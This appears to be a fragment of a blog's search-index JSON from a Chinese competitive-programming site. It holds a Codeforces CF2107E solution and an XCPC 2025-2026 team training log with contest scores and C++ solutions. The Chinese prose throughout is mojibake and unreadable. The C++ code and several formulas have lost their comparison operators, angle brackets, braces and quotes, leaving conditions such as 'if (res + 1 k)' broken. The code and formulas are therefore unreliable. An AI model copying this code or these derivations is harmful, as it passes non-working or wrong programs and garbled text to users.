ç‰Œå•ç‹¬è®¡ç®—è´¡çŒ®ã€‚ä¹Ÿå°±æ˜¯ $\\sum \\limits_{i = 1}^m |S_j| =\\sum \\limits_{i = 1}^k \\textbf{1}_{t_i 0} = \\sum \\limits_{i = 1}^k t_i$ã€‚å…±æœ‰ $k$ å¼ ç‰Œï¼Œæ‰€æœ‰åˆæ³•çš„ $\\{t_i\\}$ çš„æ–¹æ¡ˆæ•°ä¸º $(m + 1)^k$ã€‚å¼ºåˆ¶ä»¤ $t_i = j$ï¼Œåˆ™è¿™å¼ ç‰Œçš„è´¡çŒ®ä¸º $(m + 1)^{k - 1}$ã€‚ç”±äº $t_i \\in \\{0,1,\\cdots,m\\}$ï¼Œåˆ™è¿™å¼ ç‰Œå‡ºç°åœ¨é›†åˆé‡Œçš„æ¬¡æ•°ä¸º $(0 + 1 + \\cdots + m) \\times (m + 1)^{k - 1}$ï¼Œå³ $\\frac{m(m + 1)^k}{2}$ã€‚å†ç”±äº $k$ å¼ ç‰Œç­‰ä»·ï¼Œæ‰€ä»¥æœ€åçš„ç­”æ¡ˆä¸º \\dfrac{km(m + 1)^k}{2}","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF2107E Ain and Apple Tree","path":"/2025/05/07/CF2107E/","content":"é¦–å…ˆè€ƒè™‘æ— è§£çš„æƒ…å†µã€‚ å½“è¿™æ£µæ ‘ä¸ºä¸€æ¡é“¾æ—¶ï¼Œç­”æ¡ˆå–åˆ°æœ€å¤§å€¼ã€‚è¯æ˜å¾ˆç®€å•ï¼Œå‡è®¾å­˜åœ¨ä¸€ä¸ªèŠ‚ç‚¹ $u$ è‡³å°‘æœ‰ $2$ ä¸ªå­©å­èŠ‚ç‚¹ï¼Œä»»å–ä¸¤ä¸ª $v_1,v_2$ï¼Œåˆ™ $\\text{dep}(\\operatorname{LCA}(v_1,v_2)) = \\text{dep}(u)$ï¼Œæ­¤æ—¶è¿›è¡Œè°ƒæ•´ï¼Œå°† $v_1$ ä¸ $v_2$ æ”¹ä¸ºç›´æ¥ç›¸è¿ï¼Œèƒ½å¤Ÿå¢å¤§ç­”æ¡ˆã€‚å³æ–­å¼€ $(u,v_2)$ï¼Œè¿æ¥ $(v_1,v_2)$ï¼Œåˆ™æœ‰ $\\text{dep}(\\operatorname{LCA}(v_1,v_2)) = \\text{dep}(v_1) \\text{dep}(u)$ã€‚å› æ­¤å‡è®¾ä¸æˆç«‹ï¼Œå‘½é¢˜å¾—è¯ã€‚ ä»¤ $f_i$ è¡¨ç¤º $n = i$ æ—¶çš„å½¢æˆé“¾çš„ç­”æ¡ˆï¼Œåˆ™æœ‰ï¼š f_n = \\sum _{i = 0}^{n - 1} i \\times (n - i - 1) = (n - 1)\\sum_{i = 0}^{n - 1}i - \\sum_{i = 0}^{n - 1} i^2\\\\ =\\frac{n(n - 1)^2}{2} - \\frac{n(n - 1)(2n - 1)}{6} = \\frac{n(n - 1)(n - 2)}{6}å› æ­¤ $k ans + 1$ æ—¶æ— è§£ã€‚ é¦–å…ˆæ„é€ å‡º $i$ ä¸ $i + 1$ è¿è¾¹æ‰€å½¢æˆçš„é“¾ï¼Œä¹‹åè€ƒè™‘è¿›è¡Œè°ƒæ•´ã€‚åˆå§‹æ—¶ $l = 1,r = n$ï¼Œ$[l,r]$ å½¢æˆä¸»é“¾ã€‚æ¯æ¬¡è€ƒè™‘å°† $r - 1$ ä¸ $r$ æ–­è¾¹å¹¶å°† $r$ è¿è‡³ $l$ ä¸Šã€‚åˆ†æå¯çŸ¥ï¼Œå¯¹ç­”æ¡ˆçš„å‡å°‘é‡ä¸º $(f_r - f_{r - 1}) - (f_{l + 1} - f_l) - (l - 1) (r - l - 1)$ï¼ŒåŒ–ç®€å¯å¾— $\\dfrac{(r - 1)(r - 2) - l(l - 1)}{2} - (l - 1)(r - l - 1)$ã€‚è‹¥å¯ä»¥æ“ä½œï¼Œåˆ™å®Œæˆå $r \\gets r - 1$ï¼Œå¦åˆ™ $l \\gets l + 1$ã€‚é‡å¤è°ƒæ•´æ“ä½œç›´è‡³ç¬¦åˆæ¡ä»¶ã€‚ æ¥ä¸‹å»è¯æ˜è¯¥è°ƒæ•´æ“ä½œçš„å¯è¡Œæ€§ã€‚æ˜¾ç„¶ï¼Œåœ¨ä¸æ–­æ“ä½œåï¼Œ$l$ ä¸ $r$ ä¼šä¸æ–­è¶‹è¿‘ã€‚å½“ $r - l = 2$ æ—¶ï¼Œæ¶ˆå» $r$ å¹¶ä»£å…¥å¾—ï¼Œè¯¥æ“ä½œå¯¹ç­”æ¡ˆçš„å‡å°‘é‡ä¸º $\\frac{(l + 1)l - l(l - 1)}{2} - (l - 1)(l + 2 - l - 1) = 1$ï¼Œè€Œ $r - l = 1$ æ—¶ä¸ä¼šæ”¹å˜ç­”æ¡ˆã€‚èƒ½å¤Ÿæ”¹å˜ç­”æ¡ˆçš„å‡å°‘é‡ä¸º $1$ï¼Œå› æ­¤å½“æœ‰è§£æ—¶ï¼Œæ€»æ˜¯å­˜åœ¨ä¸€ç§è°ƒæ•´æ–¹æ¡ˆã€‚ ä»£ç å¦‚ä¸‹ï¼š #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3f#define pii pair int,intusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline ll read ();int t,n;ll k;int main () t = read (); while (t--) n = read ();k = read (); vector vector int ve (n + 1); ll res = 1ll * n * (n - 1) * (n - 2) / 6; if (res + 1 k) puts (No);continue; puts (Yes); ll l = 1,r = n;res -= k; while (abs (res) 1) ll del = (1ll * (r - 1) * (r - 2) - 1ll * l * (l - 1)) / 2 - 1ll * (r - l - 1) * (l - 1); if (del = res) res -= del,ve[l].push_back (r--); else ++l; for (int u = 1;u = n;++u) for (auto v : ve[u]) printf (%d %d ,u,v); for (int i = 1;i r;++i) printf (%d %d ,i,i + 1); return 0;inline ll read () ll s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"2025-2026 XCPC","path":"/2025/05/02/XCPC2025-2026/","content":"åŸºæœ¬ä¿¡æ¯æœ¬èµ›å­£ç”± ç»„é˜Ÿï¼Œå…¨é å¤§ä½¬å¸¦é£~ã€‚ ä¸­æ–‡é˜Ÿåï¼šæ­£åœ¨éªŒè¯è¯¥é˜Ÿæ˜¯å¦æ˜¯çœŸäººã€‚ è‹±æ–‡é˜Ÿåï¼šVerifying we are human. é˜Ÿå‹ Sky çš„è®°å½•ï¼è¢«å¸¦é£ï¼ï¼ï¼ è®­ç»ƒæƒ…å†µæ€»è§ˆ $\\texttt{Id}$ $\\texttt{Date}$ $\\texttt{Title}$ $\\texttt{Solved}$ $\\texttt{Dirt}$ $\\texttt{Post-contest Solved}$ $1$ $2025.05.02$ The 2023 Guangdong Provincial Collegiate Programming Contest $8/13$ $55\\%$ $10/13$ $2$ $2025.05.15$ The 2024 ICPC Asia Hangzhou Regional Contest $6/13$ $62\\%$ $6/13$ $3$ $2025.05.19$ The 2025 ICPC Wuhan Invitational Contest $5/13$ $69\\%$ $7/13$ $4$ $2025.05.21$ The 2025 ICPC China Zhejiang Province Programming Contest $6/13$ $76\\%$ $7/13$ $5$ $2025.05.22$ The 2024 ICPC Asia Shanghai Regional Contest $5/13$ $73\\%$ $7/13$ $6$ $2025.05.25$ The 2024 CCPC Jinan Site $4/13$ $50\\%$ $7/13$ $7$ $2025.05.26$ The 2024 ICPC Southeastern Europe Regional Contest $7/13$ $41\\%$ $8/13$ $8$ $2025.05.27$ The 2024 ICPC Central Europe Regional Contest $5/12$ $28\\%$ $6/12$ $9$ $2025.05.29$ The 2023 ICPC Asia Jinan Regional Contest $6/13$ $14\\%$ $7/13$ $10$ $2025.05.30$ The 2023 CCPC Guilin Site $4/13$ $60\\%$ $7/13$ $11$ $2025.06.02$ The 2025 Guangdong Provincial Collegiate Programming Contest $5/13$ $62\\%$ $8/13$ $12$ $2025.07.15$ 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥1 $4/12$ $33\\%$ $6/12$ $13$ $2025.07.17$ 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥2 $7/13$ $59\\%$ $7/13$ $14$ $2025.07.22$ 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥3 $7/13$ $42\\%$ $7/13$ $15$ $2025.07.24$ 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥4 $4/13$ $50\\%$ $8/13$ $16$ $2025.07.29$ 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥5 $4/13$ $43\\%$ $6/13$ $17$ $2025.07.31$ 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥6 $5/13$ $29\\%$ $8/13$ $18$ $2025.08.05$ 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥7 $5/10$ $64\\%$ $5/10$ $19$ $2025.08.07$ 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥8 $5/11$ $38\\%$ $6/11$ $20$ $2025.08.12$ 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥9 $5/13$ $55\\%$ $6/12$ $21$ $2025.08.14$ 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥10 $5/12$ $38\\%$ $7/12$ $22$ $2025.08.30$ The 2023 CCPC Harbin Site $6/13$ $33\\%$ $6/13$ $23$ $2025.08.31$ The 2023 CCPC Qinghuangdao Site $5/13$ $44\\%$ $6/13$ $24$ $2025.09.05$ The 15th Shandong Provincial Collegiate Programming Contest $7/13$ $50\\%$ $7/13$ $25$ $2025.09.07$ The 2025 ICPC Asia East Continent Online Contest (I) $6/13$ $14\\%$ $8/13$ $26$ $2025.09.14$ The 2025 ICPC Asia East Continent Online Contest (II) $4/12$ $33\\%$ $8/12$ $27$ $2025.09.20$ The 2025 CCPC Online Contest $6/13$ $45\\%$ $8/13$ $28$ $2025.09.11$ The 2023 ICPC Asia Hefei Regional Contest $4/12$ $71\\%$ $5/12$ $29$ $2025.09.25$ The 2021 ICPC Southeastern European Regional Programming Contest $8/14$ $42\\%$ $9/14$ $30$ $2025.10.02$ The 2022 ICPC Asia Hong Kong Regional Contest $6/12$ $57\\%$ $9/12$ $31$ $2025.10.09$ The 2024 ICPC Asia Hong Kong Regional Contest $5/13$ $54\\%$ $6/13$ $32$ $2025.10.13$ The 2018 ICPC Asia Qingdao Regional Contest $7/13$ $12\\%$ $8/13$ $33$ $2025.10.17$ The 2024 ICPC Asia Shenyang Regional Contest $3/13$ $50\\%$ $6/13$ $34$ $2025.10.19$ The 2024 Shandong Provincial Collegiate Programming Contest $8/13$ $38\\%$ $9/13$ $35$ $2025.10.23$ The 2025 ICPC Asia Xiâ€™an Regional Contest $5/13$ $44\\%$ $8/13$ $36$ $2025.10.26$ The 2025 ICPC Asia Chengdu Regional Contest $6/13$ $33\\%$ $9/13$ $37$ $2025.11.02$ The 2025 ICPC Asia Wuhan Regional Contest $5/13$ $37\\%$ $7/13$ $38$ $2025.11.05$ The 2022 ICPC Asia Nanjing Regional Contest $7/13$ $46\\%$ $7/13$ $39$ $2025.11.09$ The 2025 ICPC Asia Nanjing Regional Contest $4/13$ $42\\%$ $7/13$ $40$ $2025.11.23$ The 2025 ICPC Asia Shenyang Regional Contest $4/13$ $33\\%$ $7/13$ $41$ $2025.11.30$ The 2025 CCPC Chongqing Site $4/13$ $20\\%$ $4/13$ $42$ $2025.12.20$ The 2025 ICPC Asia Taichung Regional Programming Contest $8/14$ $27\\%$ $10/14$ $43$ $2026.01.02$ The 2025 ICPC North America East Central Regional Contest (ECNA 2025) $8/12$ $50\\%$ $10/12$ $44$ $2026.01.07$ The 2021 ICPC Asia East Continent Final Contest (EC-Final 2021) $6/13$ $54\\%$ $9/13$ $45$ $2026.01.09$ The 2022 ICPC Asia East Continent Final Contest (EC-Final 2022) $4/13$ $43\\%$ $8/13$ $46$ $2026.01.11$ The 2024 ICPC Europe Championship $5/11$ $64\\%$ $8/11$ $47$ $2026.01.14$ The 2024 ICPC North America Championship $7/13$ $50\\%$ $9/13$ $48$ $2026.01.18$ The 2025 ICPC Europe Championship $4/11$ $42\\%$ $6/11$ $49$ $2026.01.21$ The 2023 ICPC Asia East Continent Final Contest (EC-Final 2023) $5/13$ $0\\%$ $7/13$ è®­ç»ƒè®°å½•çœèµ›å¤‡æˆ˜2025.05.02 The 2023 Guangdong Provincial Collegiate Programming Contestå¤‡æˆ˜çœèµ›ï¼Œä¹Ÿæ˜¯ç»„é˜Ÿåçš„ç¬¬ä¸€æ¬¡è®­ç»ƒã€‚ è¿™ä¸€åœºç­¾åˆ°é¢˜æ¯”è¾ƒå¤šï¼Œä¸€å°æ—¶ä»¥å†…æŒ‰é¡ºåºè¿‡äº† A,I,C,D,Kã€‚æ¥ä¸‹æ¥æˆ‘å’Œ Sky è®¨è®ºäº†ä¸€ä¸‹ M çš„åšæ³•ï¼Œç¡®å®šäº† $O(n^2)$ çš„ DP ç»´æŠ¤ç›´å¾„ï¼Œå…¶é—´ Zlw ä¸€çœ¼ B æ¿å­é¢˜ï¼Œåœ¨ 1.5h ä¸€å‘é€šè¿‡äº†è¯¥é¢˜ã€‚ ä¹‹åæˆ‘å’Œ Zlw å°è¯•å£èƒ¡ E,Fï¼Œæ²¡é”™ä»–åŸºæœ¬å£èƒ¡å‡ºæ¥äº†ï¼Œå¤§åŠ›æ¨¡æ¿ã€‚Sky æäº¤ M é¢˜ REï¼Œæˆ‘å»ç…äº†çœ¼ï¼Œå‘ç°ä¸‰ç‚¹å…±çº¿å¯¼è‡´åˆ†æ¯ä¸º $0$ï¼Œç«‹é©¬å¸®ä»–æ”¹æˆäº†å‰ç§¯å†™æ³•ã€‚ä¹‹ååˆ WAï¼Œçœ‹äº†åŠå¤©å‘ç°æ˜¯ INF å¼€çš„ä¸å¤Ÿå¤§ï¼Œçº¢æ¸©â€¦â€¦å¥½åœ¨ 3.5h å†…é€šè¿‡ã€‚ ç„¶åæˆ‘å¼€å§‹å†™ E çš„å­—å…¸æ ‘ï¼Œå†™äº†åŠå¤©å‘ç°å·¨ä¸‘è¿˜ä¼šè¿è¡Œé”™è¯¯ï¼Œæœæ–­å«ä¸Š Zlw æ¥å†™ï¼Œåœ¨æäº¤äº†å‡ å‘åå‘ç°ç¥ç§˜é”™è¯¯ï¼Œåœ¨å°æ¦œåé€šè¿‡ã€‚ä¹‹åå°±æ˜¯ Fï¼Œå’Œé˜Ÿå‹ç¡®å®šäº†çº¿æ®µæ ‘äºŒåˆ†å†™æ³•ï¼Œä½†æ˜¯ä¼¼ä¹å’Œä»–çš„ç é£ä¸å¤ªä¸€æ ·ï¼Œäºæ˜¯è¢«è¸¹ä¸‹æ¥ã€‚ä½†æ˜¯ç”±äºå†™å¾—æœ‰ç‚¹å±ï¼Œèµ›æ—¶æ²¡è¿‡ï¼ŒçŸ¥é“èµ›å 40 min åé€šè¿‡è¯¥é¢˜ã€‚ æœ€åèµ›æ—¶ $8$ é¢˜æ”¶å°¾ï¼ˆä¸»è¦ç”± Zlw å†™äº†ä¸€å¤§åŠçš„é¢˜ orzorzorzï¼Œä»¥åŠ Sky çš„éš¾é¢˜æ”»å…‹ï¼‰ï¼ F é¢˜æœ‰ç‚¹æ·±åˆ»ï¼Œè‡ªå·±åˆå†™äº†ä¸€éã€‚ç»ˆäºç¢ç£¨å‡ºä¸ºä»€ä¹ˆèµ›æ—¶ä¼šæœ‰è¿™ä¹ˆå¤šé˜Ÿä¼è¿‡ï¼ŒåŸæ¥è¿˜æœ‰ä¸¤æ”¯ $\\log$ çš„å¼±æ™ºå†™æ³•ã€‚è¿˜æ˜¯å†™ä¸€ä¸‹çº¿æ®µæ ‘äºŒåˆ†çš„åšæ³•å§ï¼Œå€Ÿé‰´äº†ä¸€ä¸‹é¢˜è§£ï¼Œæ—¶é—´å¤æ‚åº¦ $O(\\sum k \\log n)$ã€‚ #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3f#define pii pair int,intusing namespace std;const int MAX = 4e6 + 50;const int MOD = 1e9 + 7;inline int read ();int t,n,q,cnt,ls[MAX],rs[MAX],tree[MAX];class BIT int n;vector ll c; int lowbit (int x) return x (-x); public : BIT (int n) : n (n),c (n + 1,0) void modify (int x,int v) for (int i = x;i = n;i += lowbit (i)) c[i] += v; ll query (int x) ll res = 0;for (int i = x;i;i -= lowbit (i)) res += c[i];return res;;void modify (int cur,int l,int r,int x,int v) if (!cur) cur = ++cnt,ls[cur] = rs[cur] = tree[cur] = 0; tree[cur] += v; if (l == r) return ; int mid = (l + r) 1; if (x = mid) modify (ls[cur],l,mid,x,v); else modify (rs[cur],mid + 1,r,x,v);int calc (vector int cur) int res = 0; for (auto v : cur) res += tree[v]; return res;vector int next_L (vector int cur) for (auto v : cur) v = ls[v]; return cur;vector int next_R (vector int cur) for (auto v : cur) v = rs[v]; return cur;int search_L (vector int cur,int l,int r,int pos) if (calc (cur) == r - l + 1) return 0; if (l == r) return l; int mid = (l + r) 1; if (pos = mid) return search_L (next_L (cur),l,mid,pos); else int res = search_L (next_R (cur),mid + 1,r,pos); if (!res) return search_L (next_L (cur),l,mid,pos); else return res; int search_R (vector int cur,int l,int r,int pos) if (calc (cur) == r - l + 1) return n + 1; if (l == r) return l; int mid = (l + r) 1; if (pos mid) return search_R (next_R (cur),mid + 1,r,pos); else int res = search_R (next_L (cur),l,mid,pos); if (res == n + 1) return search_R (next_R (cur),mid + 1,r,pos); else return res; int main () t = read (); while (t--) n = read ();q = read ();cnt = 0; vector int val (n + 1),col (n + 1),rt (n + 1,0); BIT tr (n); for (int i = 1;i = n;++i) col[i] = read (),modify (rt[col[i]],1,n,i,1); for (int i = 1;i = n;++i) val[i] = read (),tr.modify (i,val[i]); while (q--) int ty = read (); if (ty == 1) int p = read (),x = read (); modify (rt[col[p]],1,n,p,-1); col[p] = x; modify (rt[col[p]],1,n,p,1); else if (ty == 2) int p = read (),v = read (); tr.modify (p,v - val[p]); val[p] = v; else int st = read (),k = read (); vector int p; for (int i = 1;i = k;++i) int x = read (); p.push_back (rt[x]); int l = search_L (p,1,n,st),r = search_R (p,1,n,st); printf (%lld ,tr.query (r - 1) - tr.query (l + 1 - 1)); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f; 2025.05.15 The 2024 ICPC Asia Hangzhou Regional Contestä¸Šåˆè€ƒå®ŒæœŸæœ«ï¼Œå¼€å¯æš‘å‡ç”Ÿæ´»ï¼ çœæµï¼š$6$ é¢˜æ”¶å°¾ã€‚è¿‡é¢˜é¡ºåº A,K,E,H,M,Fã€‚ å¯èƒ½æ˜¯ä¸Šåˆè€ƒçº¿ä»£è€ƒå‚»äº†ï¼Œç­¾åˆ°é¢˜å†™äº†åŠå°æ—¶æ‰è¿‡ã€‚$A$ ç”¨å¹¶æŸ¥é›†ç»´æŠ¤å³å¯ï¼Œå¯æ˜¯ä¸€å¼€å§‹å†™å¾—æœ‰ç‚¹ä¹±ï¼ŒWA äº† $2$ æ¬¡æ‰è¿‡ã€‚æ¥ç€é˜Ÿå‹å†™ Kï¼Œä¸çŸ¥é“æ€ä¹ˆå›äº‹æ€è·¯æ²¡é—®é¢˜å°±æ˜¯è¿‡ä¸äº†ã€‚æˆ‘å¬å®Œæ€è·¯ç›´æ¥ç»™ä»–é‡å†™äº†ï¼Œç„¶åå°±è¿‡äº†ï¼Œéå¸¸ç¥å¥‡ï¼ˆè¯´æ˜é˜Ÿå‹ç åŠ›æœ‰ç‚¹å¼±ï¼Œéœ€è¦åŠ è®­~ï¼‰ã€‚ æ¥ç€ Zlw ä½¬å¼€å§‹æ•² Bï¼Œæ•²å®Œäº¤äº†ä»¥åæ‰å‘ç°æŠŠé¢˜ç›®ç†è§£æˆäº†æˆ–è¿ç®—ï¼Œäºæ˜¯ä¹ï¼Œä¸€ç›´åªèƒ½æƒ³åˆ°åŒ log çš„åšæ³•ã€‚æˆ‘è¿™è¾¹çœ‹äº†ä¸‹ Eï¼Œä¸€å¼€å§‹è®¤ä¸ºæ˜¯ DPï¼Œæƒ³äº†ä¸€ä¼šå„¿å‘ç°æ›´åƒæ˜¯è´ªå¿ƒã€‚å’Œ Zlw ä½¬è¿›ä¸€æ­¥è®¨è®ºäº†ä¸€ä¸‹æ„Ÿè§‰æ²¡å•¥é—®é¢˜ã€‚è®¾å½“å‰å¤„åœ¨ $f$ å±‚ï¼Œæ‰¾åˆ° $l$ åœ¨ $f$ ä¹‹ä¸‹çš„ $r$ æœ€å¤§çš„é‚£ä¸ªï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œå°±éœ€è¦èŠ±è´¹é¢å¤–çš„èƒ½é‡å‘ä¸Šè¿åŠ¨ã€‚ç­‰åˆ°è¾¾æœ€é¡¶ç«¯ååœ¨å¾€ä¸‹é™ï¼Œå¤„ç†ä¸€ä¸‹å‰©ä½™çš„åŒºé—´ï¼Œæ­¤æ—¶ä¸éœ€è¦é¢å¤–èŠ±è´¹ã€‚å› æ­¤ç›´æ¥å¯ä»¥ä¼˜å…ˆé˜Ÿåˆ—ç»´æŠ¤ï¼Œä»è€Œåšåˆ° $O(n \\log n)$ã€‚ Sky è¿™æ—¶å€™åœ¨å†™ Mï¼Œå†™å®Œä»¥åå‘ç°é¢˜ç›®çœ‹é”™ï¼Œå äº†ä¸€ä¼šå„¿æœºæ—¶ã€‚è¶ç€ä»–åœ¨è°ƒçš„æ—¶å€™ç»§ç»­å£èƒ¡ä¸‹ä¸€é¢˜ï¼Œæ˜¯æˆ‘æœ€å–œæ¬¢çš„æ„é€ ï¼ä¸éš¾æƒ³åˆ°å…ˆå–æœ€é•¿çš„é“¾ï¼Œè®¾é•¿åº¦ä¸º $k$ï¼Œäºæ˜¯å‰©ä¸‹ $[1,k - 1]$ çš„åŒºé—´å…¨éƒ¨èƒ½å¤ŸæŒ‚åœ¨è¿™æ¡é“¾ä¸Šã€‚å”¯ä¸€éœ€è¦è€ƒè™‘çš„å°±æ˜¯æœ‰å¤šæ¡é•¿åº¦ä¸º $k$ çš„é“¾çš„æƒ…å†µï¼Œæ­¤æ—¶åªè¦å‰é¢çš„åŒºé—´æ²¡æœ‰éƒ½æŒ‚åœ¨æ ¹èŠ‚ç‚¹ä¸Šå°±å­˜åœ¨è§£ã€‚ M è¿˜æœ‰ä¸€äº›é—®é¢˜ï¼Œäºæ˜¯æˆ‘æŠŠ E,H è¿™ä¸¤é¢˜éƒ½å®ç°äº†ã€‚æ¥ä¸‹å»ä»–ä¿©ä¸€èµ·åœ¨æ Mï¼Œæˆ‘å¼€å§‹çœ‹ Fã€‚M ä¼¼ä¹è¿›è¡Œæ•°è®ºåˆ†æå’Œ ST ç»´æŠ¤ä»¥åç»ˆäºè¿‡äº†ã€‚F æ˜¯å›¾è®ºï¼Œå®¹æ˜“æƒ³åˆ° scc ç¼©ç‚¹ï¼Œéš¾ç‚¹æ˜¯å¤„ç†è¯¢é—®ã€‚ä¸è¿‡è¯¢é—®åˆéå¸¸ç‰¹æ®Šï¼Œæ˜¯åœ¨ä¸€æ¡é“¾ä¸Šè¯¢é—®ï¼Œå› æ­¤å°±å¯ä»¥é€šè¿‡å‰ç¼€å’Œå¤„ç†ã€‚ä½†éœ€è¦æ³¨æ„å—å†…å¯èƒ½è¯¢é—®ç‚¹å¹¶ä¸å®Œæ•´ï¼Œå› æ­¤éœ€è¦æ›´å¤šçš„å¤„ç†ã€‚çªç„¶å¼€çªï¼Œç„¶ååœ¨æ¯”èµ›ç»“æŸå‰ 3 åˆ†é’Ÿé€šè¿‡äº†ï¼ for (int i = 1;i = n;++i) ++sz[scc[i]];for (int i = 1;i = k;++i)for (int j = 1;j = n;++j) pre[i][j] = pre[i][j - 1]; if (scc[a[i][j]] != scc[a[i][j - 1]]) tot[i][j] = 1; else pre[i][j] += tot[i][j - 1],tot[i][j] = tot[i][j - 1] + 1;while (q--) ll id = read (),l = read (),r = read (); id = (id + ans) % k + 1;l = (l + ans) % n + 1,r = (r + ans) % n + 1; if (scc[a[id][l]] == scc[a[id][r]]) ans = pre[id][r] - pre[id][l - 1] - (tot[id][l] - 1) * (r - l + 1); else ans = pre[id][r] - pre[id][l - 1] - (sz[scc[a[id][l]]] - (tot[id][l] - 1)) * (tot[id][l] - 1); printf (%lld ,ans); æ€»çš„æ¥è¯´ï¼Œè¿™åœº 6 é¢˜è¿˜æ˜¯å¾ˆä¸é”™çš„ï¼ˆä¼¼ä¹èƒ½é“¶ï¼‰ã€‚ä½†æ˜¯ç½šæ—¶è¿‡é«˜ï¼Œé€Ÿåº¦è¿˜æ˜¯æœ‰ç‚¹æ…¢ã€‚çœ‹æ¥ï¼Œè¿˜æ˜¯éœ€è¦åŠ è®­æ»´~ 2025.05.16æˆ‘å¼€å§‹è¿›ä¸€æ­¥å­¦ä¹ è®¡ç®—å‡ ä½•ï¼Œäº‰å–åœ¨çœèµ›å‰èƒ½æŠŠè¿™ä¸€å—çš„æ¨¡æ¿å¼„å…¨ã€‚å…·ä½“å†…å®¹å°±æ”¾åœ¨ä¸Šé¢çš„åšå®¢é‡Œäº†ã€‚ 2025.05.18è‡ªå·±æ‰“äº†æŠŠè¥¿å®‰äº¤é€šå¤§å­¦2025å¹´ç¨‹åºè®¾è®¡ç«èµ›æ ¡èµ›ï¼ˆåŒæ­¥èµ›ï¼‰ï¼Œè¢« F é¢˜ç¡¬æ§äº†ï¼Œæœ€åå…«é¢˜æ”¶å°¾ã€‚ 2025.05.19 The 2025 ICPC Wuhan Invitational ContestA ç­¾åˆ°ï¼ŒI ç®€å•æ„é€ ï¼ŒI æ— è§£åˆ¤æ–­å†™é”™ WA äº†ä¸€å‘ï¼ˆé˜¿å·´é˜¿å·´ï¼‰ã€‚ L ç®—æ˜¯è´ªå¿ƒï¼Œå®¹æ˜“æƒ³åˆ°æšä¸¾ç«¯ç‚¹ä½ç½®ï¼Œä½†æ˜¯å‘ç°å›ºå®šæœ€å¤§æœ€å°å€¼åä¸­ä½æ•°ä½ç½®ä¸ç¡®å®šï¼Œäºæ˜¯æ”¹ä¸ºæšä¸¾æœ€å°å€¼å’Œä¸­ä½æ•°ã€‚é˜Ÿå‹è°ƒäº†è€åŠå¤©æ‰é€šè¿‡ã€‚ F ä¼¼ä¹é¢˜è§£æ˜¯è´ªå¿ƒï¼Œä½†æ˜¯ Zlw ç”¨èƒŒåŒ…é…åˆ __int128 é€šè¿‡äº†ï¼Œå–æ¨¡æ²¡å–å®Œæ•´è´¡çŒ®ä¸€å‘ç½šæ—¶ã€‚ G æ„Ÿè§‰æœ‰ç‚¹å…¸ï¼Œå®¹æ˜“æƒ³å‡ºæŠŠæ‰€æœ‰é¢œè‰²åˆ†å¼€è€ƒè™‘ã€‚è¿™ç§æ£‹ç›˜å°±æ–¹æ¡ˆæ•°æœ‰ä¸¤ç§ DPï¼Œç®€å•çš„å°±ç›´æ¥ $O(nm)$ éå†ï¼›å¤æ‚çš„ä¾èµ–ä¸€ç§é¢œè‰²çš„æ•°é‡ $O(k)$ï¼Œè¿›è¡Œ DP å®¹æ–¥ï¼ˆCF559Cï¼‰å³å¯ã€‚äºæ˜¯æƒ³åˆ°åˆ†å—åšæ³•ï¼Œæ—¶é—´å¤æ‚åº¦ $O(mn \\sqrt {mn})$ã€‚ M è¶…ç»è®¡ç®—å‡ ä½•ï¼Œä¸€ç›´è°ƒåˆ°æœ€åã€‚å¤§è‡´åˆ†ä¸ºä¸¤ç±»ï¼Œåˆ°ç«¯ç‚¹çš„è·ç¦»ä»¥åŠä¸åŸç‚¹å’Œå‚è¶³å½¢æˆçš„ç›´çº¿åˆ°çº¿æ®µçš„äº¤ç‚¹çš„è·ç¦»ã€‚è®¾ç«¯ç‚¹æ˜¯ $\\text{S},\\text{T}$ï¼Œé¦–å…ˆåšå¹³é¢ $\\text{OST}$ï¼Œåšå‚è¶³ $F$ï¼Œè‹¥è½åœ¨ç›´çº¿ $\\text{OS},\\text{OT}$ çš„é‚£ä¸ªåŒºåŸŸä¹‹å¤–ï¼Œåˆ™åªéœ€è¦è€ƒè™‘å‰ä¸€ç§æƒ…å†µå³å¯ï¼Œå¦åˆ™ä¸¤ç§æƒ…å†µéƒ½è¦è€ƒè™‘ã€‚å…¶æ¬¡éœ€è¦è€ƒè™‘ $\\mid\\text{OF}\\mid$ å·²çŸ¥æ—¶ $\\mathbf{OF}$ çš„æ–¹å‘æ€§ã€‚æœ€åï¼Œéœ€è¦å°¤å…¶æ³¨æ„ä¸€ä¸‹ç²¾åº¦å’Œå‚ç›´çš„æƒ…å†µã€‚æˆ‘ä»¬å†™çš„æ—¶å€™ acos(x) çš„å‚æ•°ç”±äºç²¾åº¦é—®é¢˜è½åœ¨äº† $[-1,1]$ ä¹‹å¤–ï¼Œç„¶åä¸€ç›´è¾“å‡º nanï¼Œéå¸¸ä»¤äººçº¢æ¸©ã€‚ä¸è¿‡åœ¨æŸ¥çœ‹æ•°æ®å¹¶ WA æ— æ•°æ¬¡åç»ˆäºé€šè¿‡äº†æ­¤é¢˜ã€‚ 2025.05.21 The 2025 ICPC China Zhejiang Province Programming Contestè¶…å¤šç½šæ—¶åœºã€‚ B,I 